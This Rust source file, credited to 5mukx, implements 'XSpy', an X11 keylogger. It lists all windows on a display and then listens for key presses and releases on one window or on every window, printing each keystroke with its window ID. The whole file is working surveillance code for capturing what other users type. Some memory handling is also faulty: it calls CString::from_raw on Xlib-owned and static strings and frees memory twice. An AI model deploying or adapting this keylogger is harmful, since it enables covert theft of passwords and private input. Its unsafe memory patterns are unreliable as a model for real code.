// XSpy in Rust ...
// By 5mukx

extern crate x11;
use std::ffi::CString;
use std::ptr;
use x11::xlib::*;
use std::env;
use std::process;

#[derive(PartialEq)]
enum Mode {
    List,
    Spy,
}

fn print_window(disp: *mut Display, window: Window, depth: i32) {
    let indent = "  ".repeat(depth as usize);
    print!("{}0x{:08x} - ", indent, window);

    let mut window_name: *mut i8 = ptr::null_mut();
    if unsafe { XFetchName(disp, window, &mut window_name) } != 0 {
        let name = unsafe { CString::from_raw(window_name).into_string().unwrap_or_else(|_| "(invalid UTF-8)".to_string()) };
        println!("\"{}\"", name);
        unsafe { XFree(window_name as *mut _) };
    } else {
        println!("(has no name)");
    }
}

fn list_windows(disp: *mut Display, window: Window, depth: i32) {
    let mut root_window: Window = 0;
    let mut parent_window: Window = 0;
    let mut windows_list: *mut Window = ptr::null_mut();
    let mut n_windows: u32 = 0;

    if unsafe { XQueryTree(disp, window, &mut root_window, &mut parent_window, &mut windows_list, &mut n_windows) } != 0 {
        for i in 0..n_windows {
            let win = unsafe { *windows_list.add(i as usize) };
            print_window(disp, win, depth);
            list_windows(disp, win, depth + 1);
        }
        unsafe { XFree(windows_list as *mut _) };
    }
}

fn list_all_windows(disp: *mut Display) {
    let root_window = unsafe { XDefaultRootWindow(disp) };
    print_window(disp, root_window, 0);
    list_windows(disp, root_window, 1);
}

fn register_listener(disp: *mut Display, window: Window) {
    unsafe {
        XSelectInput(disp, window, KeyPressMask | KeyReleaseMask);
    }
}

fn register_listeners(disp: *mut Display, window: Window) {
    let mut root_window: Window = 0;
    let mut parent_window: Window = 0;
    let mut windows_list: *mut Window = ptr::null_mut();
    let mut n_windows: u32 = 0;

    if unsafe { XQueryTree(disp, window, &mut root_window, &mut parent_window, &mut windows_list, &mut n_windows) } != 0 {
        for i in 0..n_windows {
            let win = unsafe { *windows_list.add(i as usize) };
            register_listener(disp, win);
            register_listeners(disp, win);
        }
        unsafe { XFree(windows_list as *mut _) };
    }
}

fn register_all_listeners(disp: *mut Display) {
    let root_window = unsafe { XDefaultRootWindow(disp) };
    register_listener(disp, root_window);
    register_listeners(disp, root_window);
}

fn wait_for_keys(disp: *mut Display) {
    let mut evt: XEvent = unsafe { std::mem::zeroed() };
    let mut key_str = vec![0; 256];

    loop {
        unsafe { XNextEvent(disp, &mut evt) };

        match unsafe { evt.type_ } {
            KeyPress | KeyRelease => {
                let xkey: *mut XKeyEvent = unsafe { &mut evt.key as *mut XKeyEvent }; // Cast to mutable raw pointer
                let mut keysym: KeySym = 0;
                let size = unsafe { XLookupString(xkey, key_str.as_mut_ptr(), 256, &mut keysym, ptr::null_mut()) };
                key_str[size as usize] = 0;

                println!("0x{:08x}: ", unsafe { (*xkey).window });

                if unsafe { evt.type_ } == KeyPress {
                    print!("KeyPress: ");
                } else {
                    print!("KeyRelease: ");
                }

                // Convert i8 slice to u8 slice and print the key string
                println!("{}", String::from_utf8_lossy(unsafe {
                    std::slice::from_raw_parts(key_str.as_ptr() as *const u8, size as usize)
                }));

                // Print the key symbol
                println!("{}", unsafe { CString::from_raw(XKeysymToString(keysym)).to_str().unwrap_or_default() });
            }
            _ => println!("UnhandledEvent"),
        }
    }
}


fn display_usage() {
    eprintln!("Usage: Rust-xspy {{list | spy [window_id]| help}}");
    eprintln!("\nValid modes :");
    eprintln!("\tlist : displays all windows of the display.");
    eprintln!("\tspy : listen the windows for key events.");
    eprintln!("\thelp : this help message.");
    process::exit(1);
}

fn parse_options(args: &[String]) -> (Mode, Option<Window>) {
    if args.len() < 2 {
        display_usage();
    }

    match args[1].as_str() {
        "list" => (Mode::List, None),
        "spy" => {
            if args.len() == 3 {
                let win = Window::from_str_radix(&args[2], 16).unwrap_or_else(|_| {
                    eprintln!("Unknown number: '{}'", args[2]);
                    display_usage();
                    0
                });
                (Mode::Spy, Some(win))
            } else {
                (Mode::Spy, None)
            }
        }
        "help" => {
            display_usage();
            unreachable!();
        }
        _ => {
            eprintln!("Unknown mode '{}'", args[1]);
            display_usage();
            unreachable!();
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let (mode, window) = parse_options(&args);

    let disp = unsafe { XOpenDisplay(ptr::null()) };
    if disp.is_null() {
        eprintln!("Unable to open display");
        process::exit(1);
    }

    match mode {
        Mode::List => list_all_windows(disp),
        Mode::Spy => {
            if let Some(win) = window {
                register_listener(disp, win);
            } else {
                register_all_listeners(disp);
            }
            wait_for_keys(disp);
        }
    }

    unsafe { XCloseDisplay(disp) };
}
